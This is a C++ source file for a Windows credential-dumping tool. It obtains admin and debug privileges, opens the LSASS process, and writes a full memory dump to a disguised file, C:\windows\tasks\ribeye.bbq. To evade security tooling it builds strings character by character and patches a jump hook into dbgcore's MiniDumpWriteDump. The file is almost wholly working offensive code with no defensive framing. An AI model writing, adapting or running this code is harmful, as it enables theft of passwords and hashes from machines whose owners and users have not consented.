#include <windows.h>
#include <stdlib.h>
#include <stdio.h>
#include <TlHelp32.h>
#include <string>
#include <DbgHelp.h>

#define _ORIG_FUNCTION_BYTES 14

/*
This will dump LSASS and write the dump to disk
Location: C:\Windows\Tasks\lsass.dmp
*/

char strMiniDumpWriteDump[] = { 'M','i','n','i','D','u','m','p','W','r','i','t','e','D','u','m','p', 0x0 };
WCHAR strdbgcoredll[] = { 'd','b','g','c','o','r','e','.','d','l','l', 0x0 };

FARPROC origFunctionAddr = NULL;
char origFunctionBytes[_ORIG_FUNCTION_BYTES] = { 0 };
SIZE_T bytesWritten = 0;

HANDLE hProcess = GetCurrentProcess();

DWORD FindProcessId(const std::wstring& processName)
{
    PROCESSENTRY32 processInfo;
    processInfo.dwSize = sizeof(processInfo);
    DWORD pid = 0;


    HANDLE processesSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
    if (processesSnapshot == INVALID_HANDLE_VALUE) return 0;

    Process32First(processesSnapshot, &processInfo);
    if (!processName.compare(processInfo.szExeFile))
    {
        CloseHandle(processesSnapshot);
        pid = processInfo.th32ProcessID;
    }

    while (Process32Next(processesSnapshot, &processInfo))
    {
        if (!processName.compare(processInfo.szExeFile))
        {
            CloseHandle(processesSnapshot);
            pid = processInfo.th32ProcessID;
        }
    }

    CloseHandle(processesSnapshot);
    return pid;
}

// https://stackoverflow.com/questions/8046097/how-to-check-if-a-process-has-the-administrative-rights
BOOL IsElevated() {
    BOOL fRet = FALSE;
    HANDLE hToken = NULL;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        TOKEN_ELEVATION tElevation;
        DWORD cbSize = sizeof(TOKEN_ELEVATION);
        if (GetTokenInformation(hToken, TokenElevation, &tElevation, sizeof(tElevation), &cbSize)) {
            fRet = tElevation.TokenIsElevated;
        }
    }
    if (hToken) {
        CloseHandle(hToken);
    }
    return fRet;
}

BOOL SetDebugPrivilege() {
    HANDLE hToken = NULL;
    TOKEN_PRIVILEGES TokenPrivileges = { 0 };

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &hToken)) {
        return FALSE;
    }

    TokenPrivileges.PrivilegeCount = 1;
    TokenPrivileges.Privileges[0].Attributes = TRUE ? SE_PRIVILEGE_ENABLED : 0;

    const wchar_t* lpwPriv = L"SeDebugPrivilege";
    if (!LookupPrivilegeValueW(NULL, (LPCWSTR)lpwPriv, &TokenPrivileges.Privileges[0].Luid)) {
        CloseHandle(hToken);
        printf("I dont have SeDebugPirvs\n");
        return FALSE;
    }

    if (!AdjustTokenPrivileges(hToken, FALSE, &TokenPrivileges, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
        CloseHandle(hToken);
        printf("Could not adjust to SeDebugPrivs\n");

        return FALSE;
    }

    CloseHandle(hToken);
    return TRUE;
}

BOOL HookFunction(void* HookedFunction, char fName[] = {}) {

    // Reference the address of the hooked function 
    // so we can jump to it
    //void* hookedVirtualAlloc = &HookedFunction;
    printf("[*] Address of Hooked%s -> [ %p ]\n", fName, HookedFunction);

    // 14 bytes for the patch 
    // https://ragestorm.net/blogs/?p=107
    // Patch is: <14 bytes> -> JMP [RIP+0]; <ADDR64>
    // \xFF\x25\x00\x00\x00\x00
    // \x00\x11\x22\x33\x44\x55\x66\x77 (<ADDR64>)
    char patch[_ORIG_FUNCTION_BYTES] = { 0 };
    printf("[*] Address of %s patch[] -> [ %p ]\n", fName, patch);

    memcpy_s(patch, sizeof(patch), "\xff\x25", 2);
    memcpy_s(patch + 6, sizeof(patch), &HookedFunction, 8);

    BOOL patched = WriteProcessMemory(hProcess, (LPVOID)origFunctionAddr, patch, sizeof(patch), &bytesWritten);
    if (0 == patched) {
        printf("[-] Failed patching [ %s ]\n", fName);
        return FALSE;
    }
    else {
        printf("[+] Hooked function [ %s ]\n", fName);
        return TRUE;
    }
}

BOOL UnHookFunction(LPVOID origFunctionAddr, LPCVOID origFunctionBytes, char fName[] = {}) {

    BOOL restoreFunc = WriteProcessMemory(hProcess, (LPVOID)origFunctionAddr, origFunctionBytes, _ORIG_FUNCTION_BYTES, &bytesWritten);
    if (0 == restoreFunc) {
        printf("[-] Failed restoring function [ %s ]\n", fName);
        return FALSE;
    }
    else {
        printf("[+] Restored original %s\n", fName);
    }

    return TRUE;
}

BOOL __stdcall HookedMiniDumpWriteDump(
    HANDLE                            hProcess,
    DWORD                             ProcessId,
    HANDLE                            hFile,
    MINIDUMP_TYPE                     DumpType,
    PMINIDUMP_EXCEPTION_INFORMATION   ExceptionParam,
    PMINIDUMP_USER_STREAM_INFORMATION UserStreamParam,
    PMINIDUMP_CALLBACK_INFORMATION    CallbackParam)
{
    UnHookFunction(origFunctionAddr, origFunctionBytes, strMiniDumpWriteDump);

    return MiniDumpWriteDump(hProcess, ProcessId, hFile, DumpType, ExceptionParam, UserStreamParam, CallbackParam);

}

int main()
{
    if (FALSE == IsElevated()) {
        printf("[!] Not running as administrator\n");
        ExitProcess(1);
    }
    else {
        printf("[+] Running as administrator\n");
    }

    if (!SetDebugPrivilege()) {
        printf("no SeDebugPrivs\n");
        return -1;
    }

    origFunctionAddr = GetProcAddress(GetModuleHandleW(strdbgcoredll), strMiniDumpWriteDump);
    printf("[*] Original function address -> [ %p ]\n", origFunctionAddr);


    SIZE_T readBytes = 0;

    BOOL readOrigFunctionBytes = ReadProcessMemory(hProcess, origFunctionAddr, origFunctionBytes, _ORIG_FUNCTION_BYTES, &readBytes);
    if (0 == readOrigFunctionBytes) { return -2; }
    printf("[*] Original bytes -> [ %p ]\n", origFunctionBytes);

    BOOL minidump;
    HANDLE lsaProc;
    DWORD lsaPID;

    // File structure
    OFSTRUCT lpReOpenBuff{};

    HFILE openFile;

    lsaPID = FindProcessId(L"lsass.exe");
    lsaProc = OpenProcess(PROCESS_ALL_ACCESS, false, lsaPID);
    printf("[+] LSASS PID: %d\n", lsaPID);
    printf("[+] LSASS HANDLE: %p\n", lsaProc);

    char location[] = "C:\\windows\\tasks\\ribeye.bbq";
    printf("[*] Dumping LSASS to %s\n", location);

    HANDLE outFile = CreateFileA(location, GENERIC_ALL, 0, NULL, 2, FILE_ATTRIBUTE_NORMAL, NULL);
    if (!outFile) {
        printf("[-] Error creating file %s\n", location);
        printf("[-] Error: %d\n", GetLastError());
        return -2;
    }

    openFile = OpenFile(location, &lpReOpenBuff, OF_READWRITE);
    if (!openFile) {
        printf("[-] Error openinig file %s\n", location);
        printf("[-] Error: %d\n", GetLastError());
        return -2;
    }

    void* hookedMiniDumpAddr = &HookedMiniDumpWriteDump;

    HookFunction(hookedMiniDumpAddr, strMiniDumpWriteDump);

    printf("[+] CreateFileA Handle: %p\n", outFile);

    minidump = MiniDumpWriteDump(lsaProc, lsaPID, outFile, MiniDumpWithFullMemory, NULL, NULL, NULL);
    if (minidump == false)
    {
        printf("[-] Dumping failed ! \n\tERROR: %d\n", GetLastError());
        return -2;
    }

    printf("[+] LSASS dumped to %s\n", location);

    CloseHandle(outFile);
    CloseHandle(lsaProc);

    return 0;
}